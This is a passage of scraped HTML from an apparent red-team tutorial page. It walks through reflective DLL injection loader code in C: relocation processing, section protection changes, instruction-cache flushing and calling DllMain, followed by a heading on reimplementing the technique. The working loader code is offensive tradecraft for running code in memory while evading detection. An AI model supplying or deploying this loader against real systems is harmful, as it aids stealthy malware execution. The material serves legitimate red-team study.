bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_258qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// STEP 5: process all of our images relocations...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // calculate the base address delta and perform relocations (even if we load at desired image base)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // uiValueB = the address of the relocation directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueB = (ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // check if their are any relocations present<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // and we itterate through all entries...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; while (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiValueA = the VA for this relocation block<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiValueB = number of entries in this relocation block<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiValueD is now the first entry in the current relocation block<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // we itterate through all the entries in the current block...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while (uiValueB--)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // we dont use a switch statement to avoid the compiler building a jump table<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // which would not be very position independent!<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_DIR64)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += uiLibraryAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGHLOW)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += (DWORD)uiLibraryAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef WIN_ARM<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_ARM_MOV32T)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; register DWORD dwInstruction;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; register DWORD dwAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; register WORD wImm;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction = *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset + sizeof(DWORD));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // flip the words to get the instruction as expected<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // sanity chack we are processing a MOV instruction...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((dwInstruction &amp; ARM_MOV_MASK) == ARM_MOVT)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // pull out the encoded 16bit value (the high portion of the address-to-relocate)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wImm = (WORD)(dwInstruction &amp; 0x000000FF);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wImm |= (WORD)((dwInstruction &amp; 0x00007000) &gt;&gt; 4);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wImm |= (WORD)((dwInstruction &amp; 0x04000000) &gt;&gt; 15);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wImm |= (WORD)((dwInstruction &amp; 0x000F0000) &gt;&gt; 4);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // apply the relocation to the target address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwAddress = ((WORD)HIWORD(uiLibraryAddress) + wImm) &amp; 0xFFFF;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // now create a new instruction with the same opcode and register param.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction = (DWORD)(dwInstruction &amp; ARM_MOV_MASK2);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // patch in the relocated address...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction |= (DWORD)(dwAddress &amp; 0x00FF);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction |= (DWORD)(dwAddress &amp; 0x0700) &lt;&lt; 4;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction |= (DWORD)(dwAddress &amp; 0x0800) &lt;&lt; 15;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwInstruction |= (DWORD)(dwAddress &amp; 0xF000) &lt;&lt; 4;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // now flip the instructions words and patch back into the code...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset + sizeof(DWORD)) = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_HIGH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += HIWORD(uiLibraryAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else if (((PIMAGE_RELOC)uiValueD)-&gt;type == IMAGE_REL_BASED_LOW)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) += LOWORD(uiLibraryAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next entry in the current relocation block<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueD += sizeof(IMAGE_RELOC);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next entry in the relocation directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Set final protections for headers and sections to mirror the PE’s intent.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_298qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">//<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // Step 6: Adjust section permissions<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; //<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // uiValueA = the VA of the first section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueA = ((ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.SizeOfOptionalHeader);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; while (uiValueE--)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueB is the VA for this section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; pVirtualProtect(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (LPVOID)uiValueB,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;Misc.VirtualSize,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; translate_protect(((PIMAGE_SECTION_HEADER)uiValueA)-&gt;Characteristics),<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &amp;oldProt<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; );<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the next section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueA += sizeof(IMAGE_SECTION_HEADER);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Optionally flush the instruction cache and, if this module depends on loader-driven init, invoke the entry point.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2d8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// STEP 9: call our images entry point<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; pNtFlushInstructionCache((HANDLE)-1, NULL, 0);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // call our respective entry point, fudging our hInstance value<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // if we are injecting an DLL via a stub we call DllMain with no parameter<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h3 id="reimplement-the-technique" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#reimplement-the-technique"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ah8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ah8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Reimplement the Technique</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">My first sanity check was a small “map and call” PoC I found in ired.team—just enough to see each step work in isolation. The big insight: once the image lives in memory, you can walk its exports yourself and call them directly.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent 